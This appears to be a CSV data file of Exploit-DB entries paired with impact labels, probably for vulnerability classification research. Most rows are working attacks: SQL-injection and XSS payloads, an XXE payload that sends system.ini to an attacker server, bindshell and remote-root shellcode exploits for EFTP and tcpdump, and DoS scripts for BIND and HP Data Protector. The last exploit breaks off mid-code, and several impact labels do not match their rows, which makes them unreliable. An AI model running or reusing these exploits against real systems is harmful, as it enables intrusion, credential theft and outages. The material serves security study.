38297,"WordPress Plugin Wysija Newsletters - Multiple SQL Injections source: https://www.securityfocus.com/bid/57775/info  The Wysija Newsletters Plugin for WordPress is prone to multiple SQL-injection vulnerabilities.   Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   Wysija Newsletters 2.2 is vulnerable; other versions may also be affected.  http://www.example.com/wp-admin/admin.php?page=wysija_campaigns&orderby=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHA R(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114 )))) --","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
29061,"phpMyAdmin 2.x - 'sql.php?pos' Cross-Site Scripting source: https://www.securityfocus.com/bid/21137/info     phpMyAdmin is prone to multiple input-validation vulnerabilities, including an HTML-injection vulnerability, cross-site scripting vulnerabilities, and information-disclosure vulnerabilities.     An attacker could exploit these vulnerabilities to view sensitive information or to have arbitrary script code execute in the context of the affected site, which may allow the attacker to steal cookie-based authentication credentials or change the way the site is rendered to the user. Data gained could aid in further attacks.     All versions of phpMyAdmin are vulnerable.  http://www.example.com/phpmyadmin/sql.php?db=information_schema&token=your_token&goto=db_details_structure.php&table=CHARACTER_SETS&pos=&lt;/textarea&gt;'""><script>alert(document.cookie)</script>",steal cookie-based authentication credentials or change the way the site is rendered to the user,1
8922,"Worldweaver DX Studio Player < 3.0.29.1 Firefox plugin - Command Injection -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1        Core Security Technologies - CoreLabs Advisory            http://www.coresecurity.com/corelabs/      DX Studio Player Firefox plug-in command injection    1. *Advisory Information*  Title: DX Studio Player Firefox plug-in command injection Advisory ID: CORE-2009-0521 Advisory URL: http://www.coresecurity.com/content/DXStudio-player-firefox-plugin Date published: 2009-06-09 Date of last update: 2009-06-09 Vendors contacted: Worldweaver Release mode: Coordinated release   2. *Vulnerability Information*  Class: Command injection Remotely Exploitable: Yes Locally Exploitable: No Bugtraq ID: N/A CVE Name: CVE-2009-2011   3. *Vulnerability Description*  DX Studio [1] is a complete integrated development environment for creating interactive 3D graphics. DX Studio Player plug-in for Firefox [2] is vulnerable to a remote command execution vulnerability.   4. *Vulnerable packages*     . DX Studio Player v3.0.29.0    . DX Studio Player v3.0.22.0    . DX Studio Player v3.0.12.0    . Older versions are probably affected too, but they were not checked.   5. *Non-vulnerable packages*     . DX Studio Player v3.0.29.1   6. *Vendor Information, Solutions and Workarounds*  On June 1st DXStudio team patched the current release 3.0.29 to 3.0.29.1 for all new downloads to fix the problem with the Firefox plugin, and also posted a sticky announce for all its users [3].   7. *Credits*  This vulnerability was discovered and researched by Diego Juarez from Core Security Technologies.   8. *Technical Description / Proof of Concept Code*  DX Studio is a complete integrated development environment for creating interactive 3D graphics. DX Studio provides a javascript API in which the method 'shell.execute()' is defined as follows:  /-----------  Prototype: shell.execute(commandString, [paramString], [commandIsProgId]);  - -----------/  This method sends the 'commandString' to the Windows shell with optional parameters in 'paramString'. For security reasons, this function is not available when running in a web browser. If you set 'commandIsProgId' to true, you can launch a utility by its 'ProgID', e.g. 'WMP.DVD' with parameter 'play' would play a DVD in Windows Media Player.  In our tests, despite what is stated in the documentation, we found that the function is actually available to both the Internet Explorer and Firefox browser plug-ins. In the IE plug-in the user does get a warning about the security implications of allowing such '.dxstudio' file to run. On Firefox however, there is no such warning whatsoever, allowing an attacker to execute arbitrary code on the client side by luring the victim into clicking a link or visiting a malicious website.   8.1. *Proof of Concept (header.xml)*  /-----------  <?xml version=""1.0"" encoding=""utf-8"" standalone=""yes""?> <dxstudio version=""1.0.0"" width=""800"" height=""600"" defaultscriptlanguage=""javascript"">   <display frame=""yes"" hidecursor=""no"" hideconsole=""no"" hidecontext=""no"" maxfps=""100"" unthrottled=""no"" priority=""normal"" syncrefresh=""yes"" changeresolution=""no"" userresize=""yes"" workarea=""no"" windowmask=""no"" src="""" minplayerversion=""1.0.0"">     <loading console=""yes"" custom=""no"" custombackground=""no"" customlogo=""yes"" showversion=""no"">       <prop id=""background"" type=""color"" r=""0"" g=""0"" b=""0"" a=""1"" />       <logo src="""" />       <customprogress />     </loading>   </display>   <script>     <![CDATA[function onInit() { shell.execute(""cmd.exe"",""/k cls|@echo this is wrong, very wrong."") } ] ]>   </script>   <licenseinfo stamp=""cgdaaaaa"" />   <security>     <prop id=""password"" type=""string"" value="""" />     <prop id=""allowplayer"" type=""bool"" state=""no"" />     <prop id=""nocache"" type=""bool"" state=""yes"" />   </security> </dxstudio>  - -----------/  Note: The security vulnerability is also exploitable on the standalone player, however, this functionality appears to be the expected behavior and fully intended for the standalone player.   9. *Report Timeline*  . 2009-05-21: Core Security Technologies notifies the Worldweaver Support Team (WST) of the vulnerability and announces its initial plan to publish the content on June 15th, 2009.  . 2009-05-26: The WST asks Core for a technical description of the vulnerability.  . 2009-05-26: Technical details sent to WST by Core.  . 2009-06-08: Core asks WST for an estimated date to fix this issue.  . 2009-06-08: WST notifies Core that a fix has already been produced and it is available to the users.  . 2009-06-09: The advisory CORE-2009-0521 is published.   10. *References*  [1] http://www.dxstudio.com. [2] http://www.dxstudio.com/download2.aspx. [3] http://www.dxstudio.com/forumtopic.aspx?topicid=b4152459-fb5f-4933-b700-b3fbd54f6bfd   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/corelabs.   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.   13. *Disclaimer*  The contents of this advisory are copyright (c) 2009 Core Security Technologies and (c) 2009 CoreLabs, and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc. -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.7 (MingW32) Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org  iD8DBQFKLtHJyNibggitWa0RAlq1AJ0cZPpDqReJWHd0toN7tnTFLVA99gCgiG/Q PMPteYbShbRU4j4tIk93HPM= =Mx5G -----END PGP SIGNATURE-----  # milw0rm.com [2009-06-10]",command execution,1
21109,"EFTP 2.0.7 337 - Remote Buffer Overflow Code Execution / Denial of Service // source: https://www.securityfocus.com/bid/3330/info  Encrypted FTP (EFTP) is both an FTP client and server application for Windows platforms.  A malicious user with upload permissions to the target host can cause a buffer overflow in EFTP to execute code of the attacker's choosing. The attacker can potentially use this exploit to open a bindshell on the target host. Another possible result of this exploit is a denial of service.   /***************************************************************  * EFTP Version 2.0.7.337 remote exploit                       *  *                                                             *  * create spl0it.lnk                                           *  * upload the file using the EFTP client                       *  * (since I'm not planning to rewrite that blowfish crypto)    *  * then issue an LS command on the server                      *  *                                                             *  * impact: SYSTEM level access CMD.EXE shell on port 6968      *  *                                                             *  * [ByteRage] <byterage@yahoo.com> http://www.byterage.cjb.net *  ***************************************************************/  #include <stdio.h>  #define FileName ""spl0it.lnk""  /* You should set the following three consts according  * to the DLL you are basing the exploit upon, examples :  *********************************************  * DLL Name    : MSVCRT.DLL  * Version     : v6.00.8797.0000  * File Length : 278581 bytes  * newEIP =             ""\x1C\xDF\x01\x78"" (*)  * LoadLibraryRef       ""\xD4\x10\x03\x78""  * GetProcAddressRefADD ""\xFC""  *********************************************  * DLL Name    : MSVCRT.DLL  * Version     : v6.00.8397.0000  * File Length : 266293 bytes  * newEIP =             ""\x55\xE4\x01\x78"" (*)  * LoadLibraryRef       ""\xD4\xE0\x02\x78""  * GetProcAddressRefADD ""\xFC""  *********************************************  * (*) the new EIP must CALL/JMP/... either  *     EAX or EBX  */ const char * newEIP =        ""\x55\xE4\x01\x78""; #define LoadLibraryRef       ""\xD4\xE0\x02\x78"" #define GetProcAddressRefADD ""\xFC""  /* The following 452b shellcode  * spawns a cmd.exe shell on port 6968  * and is a personal rewrite of  * dark spyrit's original code  */  /* ==== SHELLC0DE START ==== */  const char shellc0de[] =    /* CODE: */ ""\x8b\xf0\xac\x84\xc0\x75\xfb\x8b\xfe\x33\xc9\xb1\xc1\x4e\x80\x36"" ""\x99\xe2\xfa\xbb""LoadLibraryRef""\x56\xff\x13\x95\xac\x84\xc0\x75"" ""\xfb\x56\x55\xff\x53""GetProcAddressRefADD""\xab\xac\x84\xc0\x75\xfb\xac\x3c\x21\x74"" ""\xe7\x72\x03\x4e\xeb\xeb\x33\xed\x55\x6a\x01\x6a\x02\xff\x57\xe8"" ""\x93\x6a\x10\x56\x53\xff\x57\xec\x6a\x02\x53\xff\x57\xf0\x33\xc0"" ""\x57\x50\xb0\x0c\xab\x58\xab\x40\xab\x5f\x55\x57\x56\xad\x56\xff"" ""\x57\xc0\x55\x57\xad\x56\xad\x56\xff\x57\xc0\xb0\x44\x89\x07\x57"" ""\xff\x57\xc4\x8b\x46\xf4\x89\x47\x3c\x89\x47\x40\xad\x89\x47\x38"" ""\x33\xC0\x89\x47\x30\x66\xb8\x01\x01\x89\x47\x2c\x57\x57\x55\x55"" ""\x55\x6a\x01\x55\x55\x56\x55\xff\x57\xc8\xff\x76\xf0\xff\x57\xcc"" ""\xff\x76\xfc\xff\x57\xcc\x55\x55\x53\xff\x57\xf4\x93\x33\xc0\xb4"" ""\x04\x50\x6a\x40\xff\x57\xd4\x96\x6a\x50\xff\x57\xe0\x8b\xcd\xb5"" ""\x04\x55\x55\x57\x51\x56\xff\x77\xaf\xff\x57\xd0\x8b\x0f\xe3\x18"" ""\x55\x57\x51\x56\xff\x77\xaf\xff\x57\xdc\x0b\xc0\x74\x21\x55\xff"" ""\x37\x56\x53\xff\x57\xf8\xeb\xd0\x33\xc0\x50\xb4\x04\x50\x56\x53"" ""\xff\x57\xfc\x55\x57\x50\x56\xff\x77\xb3\xff\x57\xd8\xeb\xb9\xff"" ""\x57\xe4""  /* DATA: (XORed with 099) */ ""\xd2\xdc\xcb\xd7\xdc\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9"" ""\xf0\xe9\xfc\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7"" ""\xff\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea"" ""\xea\xd8\x99\xda\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xc9"" ""\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9\xf0\xe9\xfc\x99\xde\xf5\xf6"" ""\xfb\xf8\xf5\xd8\xf5\xf5\xf6\xfa\x99\xce\xeb\xf0\xed\xfc\xdf\xf0"" ""\xf5\xfc\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc"" ""\xe9\x99\xdc\xe1\xf0\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xb8\xce"" ""\xca\xd6\xda\xd2\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0"" ""\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed"" ""\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\x99\x9b\x99\x82\xa1"" ""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\xfa\xf4\xfd\x99""  ""\x00"";  /* ==== SHELLC0DE ENDS ==== */  ;  int i;  FILE *file;  int main () {      printf(""EFTP Version 2.0.7.337 remote exploit by [ByteRage]\n"");    file = fopen(FileName, ""w+b"");   if (!file) {     printf(""ERROR! Couldn't open ""FileName"" for output !\n"");     return 1;   }      for (i=0; i<1740; i++) { fwrite(""\x90"", 1, 1, file); }   fwrite(""\xEB\x06\x90\x90"", 1, 4, file);     fwrite(newEIP, 1, 4, file);    fwrite(shellc0de, 1, sizeof(shellc0de)-1, file);    fclose(file);    printf(FileName"" created! (Shellcode length: %i bytes)\n"", sizeof(shellc0de));   return 0;  }",denial of service,1
20892,"Olicom XLT-F XL 80 IM V5.5BL2 - Undocumented Community String source: https://www.securityfocus.com/bid/2802/info  Olicom routers were previously manufactured and distributed by Olicom, a company now owned by Intel. Olicom routers provide a low-cost routing solution for small businesses.  A problem with Olicom routers could allow unauthorized access to certain configuration variables within the device. The ILMI SNMP Community string allows read and write access to certain configuration parameters such as the organization to which the routers belongs. These parameters do not affect normal operation, but could be used further in a social engineering attack.  This problem makes it possible for a remote user to launch a social engineering attack, potentially gaining unauthorized access to the device.   snmpwalk router ILMI |more",unauthorized access to certain configuration variables within the device,1
40859,"Microsoft Authorization Manager 6.1.7601 - 'azman' XML External Entity Injection [+] Credits: John Page aka hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-AZMAN-XXE-FILE-EXFILTRATION.txt  [+] ISR: ApparitionSec    Vendor: ================== www.microsoft.com    Product: ============================== Microsoft Authorization Manager v6.1.7601  The Authorization Manager allows you to set role-based permissions for Authorization Manager-enabled applications.  You can store authorization stores in either XML files, Active Directory Domain Services (AD DS), Active Directory Lightweight Directory Services (AD LDS), or in Microsoft SQL Server databases.    Vulnerability Type: =================== XML External Entity    CVE Reference: ============== N/A    Vulnerability Details: =====================  ""msxml3.dll"" DLL is used by ""Microsoft Management Console""  azman.msc  / eventvwr.msc and other Windows components to process XML files.  The parser processes XML External Entity nodes allowing external connections to be made to remote malicious DTD documents that can potentially allow access to files on users system to be exfiltrated to a remote server. Therefore the XML parser is vulnerable to XXE attack if a user unknowingly opens a malicious XML 'authorization store' document via remote share/USB into 'Authorization Manager'.  ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\azman.msc"" ""C:\Windows\System32\msxml3.dll""   Exploit code(s): ===============  Start our listener on attacker server to access users files. python -m SimpleHTTPServer 8080   Create the evil XML file with following payload to steal ""system.ini"" as data theft POC.  <?xml version=""1.0""?> <!DOCTYPE roottag [ <!ENTITY % file SYSTEM ""C:\Windows\system.ini""> <!ENTITY % dtd SYSTEM ""http://attacker-server:8080/payload.dtd""> %dtd;]> <pwn>&send;</pwn>   Next, create the ""payload.dtd"" DTD document to host on attacker server.  <?xml version=""1.0"" encoding=""UTF-8""?> <!ENTITY % all ""<!ENTITY send SYSTEM 'http://attacker-server:8080?%file;'>""> %all;    1) Go to Windows CL and type azman to bring up Authorization Manager  2) Go to Action / ""Open Authorization store...""  3) Select authorization store type to be 'XML file'  4) Browse to open the ""PWN.XML"" authorization store file and click Ok   User will see error message ""Cannot open the authorization store. The following problem occurred: An attempt was made to load a program with an incorrect format.""  Result: files delivered to your server!     Disclosure Timeline: =========================================== Vendor Notification:  August 30, 2016 Vendor Reply: August 30, 2016 does not meet the bar for servicing as someone would have to obtain the XML from an untrusted source or compromised source"" December 4, 2016 : Public Disclosure     Exploitation Technique: ======================= Local / Remote     [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.  hyp3rlinx",privilege escalation,1
27646,LifeType 1.0.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17529/info  LifeType is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[lifetype_dir]/index.php?op=Template&blogId=1&show=[XSS_here],have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
40453,"ISC BIND 9 - Denial of Service import socket import struct  TARGET = ('192.168.200.10', 53)  Q_A = 1 Q_TSIG = 250 DNS_MESSAGE_HEADERLEN = 12   def build_bind_nuke(question=""\x06google\x03com\x00"", udpsize=512):     query_A = ""\x8f\x65\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01"" + question + int16(Q_A) + ""\x00\x01""      sweet_spot = udpsize - DNS_MESSAGE_HEADERLEN + 1     tsig_rr = build_tsig_rr(sweet_spot)      return query_A + tsig_rr  def int16(n):     return struct.pack(""!H"", n)  def build_tsig_rr(bind_demarshalled_size):     signature_data = (""\x00\x00\x57\xeb\x80\x14\x01\x2c\x00\x10\xd2\x2b\x32\x13\xb0\x09""                       ""\x46\x34\x21\x39\x58\x62\xf3\xd5\x9c\x8b\x8f\x65\x00\x00\x00\x00"")     tsig_rr_extra_fields = ""\x00\xff\x00\x00\x00\x00""      necessary_bytes  = len(signature_data) + len(tsig_rr_extra_fields)     necessary_bytes += 2 + 2 # length fields      # from sizeof(TSIG RR) bytes conforming the TSIG RR     # bind9 uses sizeof(TSIG RR) - 16 to build its own     sign_name, algo_name = generate_padding(bind_demarshalled_size - necessary_bytes + 16)      tsig_hdr = sign_name + int16(Q_TSIG) + tsig_rr_extra_fields     tsig_data = algo_name + signature_data     return tsig_hdr + int16(len(tsig_data)) + tsig_data  def generate_padding(n):     max_per_bucket = [0x3f, 0x3f, 0x3f, 0x3d, 0x3f, 0x3f, 0x3f, 0x3d]     buckets = [1] * len(max_per_bucket)      min_size = len(buckets) * 2 + 2 # 2 bytes for every bucket plus each null byte     max_size = sum(max_per_bucket) + len(buckets) + 2      if not(min_size <= n <= max_size):         raise RuntimeException(""unsupported amount of bytes"")      curr_idx, n = 0, n - min_size     while n > 0:         next_n = max(n - (max_per_bucket[curr_idx] - 1), 0)         buckets[curr_idx] = 1 + n - next_n         n, curr_idx = next_n, curr_idx + 1      n_padding = lambda amount: chr(amount) + ""A"" * amount     stringify = lambda sizes: """".join(map(n_padding, sizes)) + ""\x00""      return stringify(buckets[:4]), stringify(buckets[4:])  if __name__ == ""__main__"":     bombita = build_bind_nuke()      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)     s.sendto(bombita, TARGET)     s.close()  ''' ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'timeout' require 'socket'  class MetasploitModule < Msf::Auxiliary    include Msf::Exploit::Capture   include Msf::Auxiliary::UDPScanner   include Msf::Auxiliary::Dos   include Msf::Auxiliary::Report    def initialize(info={})     super(update_info(info,       'Name'        => 'BIND 9 DoS CVE-2016-2776',       'Description' => %q{           Denial of Service Bind 9 DNS Server CVE-2016-2776.           Critical error condition which can occur when a nameserver is constructing a response.           A defect in the rendering of messages into packets can cause named to exit with an           assertion failure in buffer.c while constructing a response to a query that meets certain criteria.            This assertion can be triggered even if the apparent source address isnt allowed           to make queries.       },       # Research and Original PoC - msf module author       'Author'      => [ 'Martin Rocha', 'Ezequiel Tavella', 'Alejandro Parodi', 'Infobyte Research Team'],       'License'     => MSF_LICENSE,       'References'      =>         [           [ 'CVE', '2016-2776' ],           [ 'URL', 'http://blog.infobytesec.com/2016/10/a-tale-of-dns-packet-cve-2016-2776.html' ]         ],       'DisclosureDate' => 'Sep 27 2016',       'DefaultOptions' => {'ScannerRecvWindow' => 0}     ))      register_options([       Opt::RPORT(53),       OptAddress.new('SRC_ADDR', [false, 'Source address to spoof'])     ])      deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')   end    def check_server_status(ip, rport)     res = """"     sudp = UDPSocket.new     sudp.send(valid_query, 0, ip, rport)     begin       Timeout.timeout(5) do       res = sudp.recv(100)     end     rescue Timeout::Error     end      if(res.length==0)       print_good(""Exploit Success (Maybe, nameserver did not replied)"")       else         print_error(""Exploit Failed"")     end   end    def scan_host(ip)     @flag_success = true     print_status(""Sending bombita (Specially crafted udp packet) to: ""+ip)     scanner_send(payload, ip, rport)     check_server_status(ip, rport)   end    def get_domain     domain = ""\x06""+Rex::Text.rand_text_alphanumeric(6)     org = ""\x03""+Rex::Text.rand_text_alphanumeric(3)     get_domain = domain+org   end    def payload     query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65     query += ""\x00\x00""  # Flags: 0x0000 Standard query     query += ""\x00\x01""  # Questions: 1     query += ""\x00\x00""  # Answer RRs: 0     query += ""\x00\x00""  # Authority RRs: 0     query += ""\x00\x01""  # Additional RRs: 1      # Doman Name     query += get_domain   # Random DNS Name     query += ""\x00""      # [End of name]     query += ""\x00\x01""  # Type: A (Host Address) (1)     query += ""\x00\x01""  # Class: IN (0x0001)      # Aditional records. Name     query += (""\x3f""+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes     query += ""\x3d""+Rex::Text.rand_text_alphanumeric(61)     query += ""\x00""      query += ""\x00\xfa"" # Type: TSIG (Transaction Signature) (250)     query += ""\x00\xff"" # Class: ANY (0x00ff)     query += ""\x00\x00\x00\x00"" # Time to live: 0     query += ""\x00\xfc"" # Data length: 252      # Algorithm Name     query += (""\x3f""+Rex::Text.rand_text_alphanumeric(63))*3 #Random 192 bytes     query += ""\x1A""+Rex::Text.rand_text_alphanumeric(26) #Random 26 bytes     query += ""\x00""      # Rest of TSIG     query += ""\x00\x00""+Rex::Text.rand_text_alphanumeric(4) # Time Signed: Jan  1, 1970 03:15:07.000000000 ART     query += ""\x01\x2c"" # Fudge: 300     query += ""\x00\x10"" # MAC Size: 16     query +=  Rex::Text.rand_text_alphanumeric(16) # MAC     query += ""\x8f\x65"" # Original Id: 36709     query += ""\x00\x00"" # Error: No error (0)     query += ""\x00\x00"" # Other len: 0   end    def valid_query     query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65     query += ""\x00\x00""  # Flags: 0x0000 Standard query     query += ""\x00\x01""  # Questions: 1     query += ""\x00\x00""  # Answer RRs: 0     query += ""\x00\x00""  # Authority RRs: 0     query += ""\x00\x00""  # Additional RRs: 0      # Doman Name     query += get_domain   # Random DNS Name     query += ""\x00""      # [End of name]     query += ""\x00\x01""  # Type: A (Host Address) (1)     query += ""\x00\x01""  # Class: IN (0x0001)s   end  end '''",code execution,1
7372,"Ikon ADManager 2.1 - Remote Database Disclosure #################################################################################################### # Ikon AdManager 2.1 (ikonBAnner_AdManager.mdb) Database Disclosure Vulnerability                  # # Â© Ghost Hacker - REAL-H.COM                                                                      # #################################################################################################### #[~] Author : Ghost Hacker                                                                         # #[~] Homepage : http://Real-h.com                                                                  # #[~] Contact Me : Ghost-r00t[at]Hotmail[dot]com                                                    # #[~] Bug : Database Disclosure                                                                     # #[~] Name Script : Ikon AdManager 2.1                                                              # #[~] Download : http://www.dotnetindex.com/downloads/easy_download_getinfo.asp?id=7                # #################################################################################################### #[~]Exploit                                                                                        # # http://xxxx.com/[path]/database/ikonBAnner_AdManager.mdb                                         # ################# ################################################################################### #[~]Greets :                                                                                       # # Mr.SaFa7 [v4-team.com] , All Members Real-h.com and v4-team.net , All My Friends (3ed mobark)    # ####################################################################################################  # milw0rm.com [2008-12-07]",information disclosure,1
15649,"HP Data Protector Manager A.06.11 MMD - Null Pointer Dereference Denial of Service #!/usr/bin/perl  # ================================= # HP Data Protector Manager A.06.11 # ================================= # # Bug: NULL Pointer Dereference Remote Denial of Service Vulnerability # # Software: http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html # # Date: 30/11/2010 # Author: Pepelux - pepelux[AT]enye-sec[DOT]com #                   http://www.enye-sec.org - http://www.pepelux.org # # Service: mmd.exe (Media Management Daemon) # Vulnerable file: \Program Files\OmniBack\bin\MSVCR71.dll # # MSVCR71.dll:7c350428 mov ax,[edx] caused access violation # when attempting to read from 0x00000000 # # Tested on Windows XP SP2  use IO::Socket;  my ($server, $port) = @ARGV ;  unless($ARGV[0] || $ARGV[1]) { 	print ""Usage: perl $0 <host> [port]\n""; 	print ""\tdefault port = 1026\n\n""; 	exit 1; }  $port = 1026 if ($ARGV[0]);  my $buf = ""\x00\x00\x00\x43\xfe\xff\x00\x32\x00\x36\x00\x37\x00\x00\x41\x41"". 		  ""\x00\x31\x00\x00\x42\x42\x00\x31\x00\x00\x43\x43\x00\x31\x00\x00"". 		  ""\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"". 		  ""\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"". 		  ""\xab\x7b\xde\x7c\x46\x4f\x4f""; 		   print ""[+] Connecting to $server:$port ...\n"";  my $sock1 = new IO::Socket::INET (PeerAddr => $server, PeerPort => $port, Timeout => '10', Proto => 'tcp') or die(""Server $server is not available.\n"");  while(1) { print ""[+] Sending malicious packet ...\n""; print $sock1 ""$buf""; print ""\n[x] Server crashed!\n"";  exit;",Denial of Service,1
20337,"tcpdump 3.4/3.5 - AFS ACL Packet Buffer Overflow /* source: https://www.securityfocus.com/bid/1870/info  tcpdump is a popular network monitoring tool used for watching network traffic written by the Lawrence Berkeley Laboratory. It must at least begin execution as root since it opens and reads from the link layer interface (through pcap). It is usually run directly by/as root.   tcpdump is vulnerable to a remotely exploitable buffer overflow in it's parsing of AFS ACL packets. This is likely the result of the AFS packet fields received over a network interface being copied into memory buffers of predefined length without checks for size. The excessive data could be used to overwrite stack variables if constructed correctly and allow the attacker (who would have sent the custom ACL packets) to gain remote access to the victim host.   Exploitation of this vulnerability would likely yield root access for the perpetrator. */  /* * Tcpdump remote root xploit (3.5.2) (with -s 500 or higher) * for Linux x86 * * By: Zhodiac <zhodiac@softhome.net> * * !Hispahack Research Team * http://hispahack.ccc.de * * This xploit was coded only to prove it can be done :) * * As usual, this xploit is dedicated to [CrAsH]] * She is ""the one"" and ""only one"" :*************** * * #include <standar/disclaimer.h> * * Madrid 2/1/2001 * * Spain r0x * */  #include <stdio.h> #include <netinet/in.h> #include <sys/types.h> #include <sys/socket.h> #include <netdb.h> #include <arpa/inet.h>  #define ADDR            0xbffff248 #define OFFSET          0 #define NUM_ADDR            10 #define NOP             0x90 #define NUM_NOP         100  #define RX_CLIENT_INITIATED     1 #define RX_PACKET_TYPE_DATA     1 #define FS_RX_DPORT             7000 #define FS_RX_SPORT             7001 #define AFS_CALL                134  struct rx_header {     u_int32_t epoch;     u_int32_t cid;     u_int32_t callNumber;     u_int32_t seq;     u_int32_t serial;     u_char type;     u_char flags;     u_char userStatus;     u_char securityIndex;     u_short spare;     u_short serviceId; };  char shellcode[] = /* By Zhodiac <zhodiac@softhome.net> */   ""\xeb\x57\x5e\xb3\x21\xfe\xcb\x88\x5e\x2c\x88\x5e\x23""   ""\x88\x5e\x1f\x31\xdb\x88\x5e\x07\x46\x46\x88\x5e\x08""   ""\x4e\x4e\x88\x5e\xFF\x89\x5e\xfc\x89\x76\xf0\x8d\x5e""   ""\x08\x89\x5e\xf4\x83\xc3\x03\x89\x5e\xf8\x8d\x4e\xf0""   ""\x89\xf3\x8d\x56\xfc\x31\xc0\xb0\x0e\x48\x48\x48\xcd""   ""\x80\x31\xc0\x40\x31\xdb\xcd\x80\xAA\xAA\xAA\xAA\xBB""   ""\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xDD\xDD\xDD\xDD\xe8\xa4""   ""\xff\xff\xff""   ""/bin/shZ-cZ/usr/X11R6/bin/xtermZ-utZ-displayZ"";  long resolve(char *name) {  struct hostent *hp;  long ip;   if ((ip=inet_addr(name))==-1) {    if ((hp=gethostbyname(name))==NULL) {         fprintf (stderr,""Can't resolve host name [%s].\n"",name);         exit(-1);       }     memcpy(&ip,(hp->h_addr),4);     }  return(ip); }   int main (int argc, char *argv[]) {   struct sockaddr_in addr,sin;  int sock,aux, offset=OFFSET;  char buffer[4048], *chptr;  struct rx_header *rxh;  long int *lptr, return_addr=ADDR;     fprintf(stderr,""\n!Hispahack Research Team (http://hispahack.ccc.de)\n"");   fprintf(stderr,""Tcpdump 3.5.2 xploit by Zhodiac <zhodiac@softhome.net>\n\n"");     if (argc<3) {     printf(""Usage: %s <host> <display> [offset]\n"",argv[0]);     exit(-1);     }    if (argc==4) offset=atoi(argv[3]);   return_addr+=offset;    fprintf(stderr,""Using return addr: %#x\n"",return_addr);    addr.sin_family=AF_INET;   addr.sin_addr.s_addr=resolve(argv[1]);   addr.sin_port=htons(FS_RX_DPORT);    if ((sock=socket(AF_INET, SOCK_DGRAM,0))<0) {      perror(""socket()"");      exit(-1);      }    sin.sin_family=AF_INET;   sin.sin_addr.s_addr=INADDR_ANY;   sin.sin_port=htons(FS_RX_SPORT);    if (bind(sock,(struct sockaddr*)&sin,sizeof(sin))<0) {       perror(""bind()"");       exit(-1);       }    memset(buffer,0,sizeof(buffer));   rxh=(struct rx_header *)buffer;    rxh->type=RX_PACKET_TYPE_DATA;   rxh->seq=htonl(1);   rxh->flags=RX_CLIENT_INITIATED;    lptr=(long int *)(buffer+sizeof(struct rx_header));   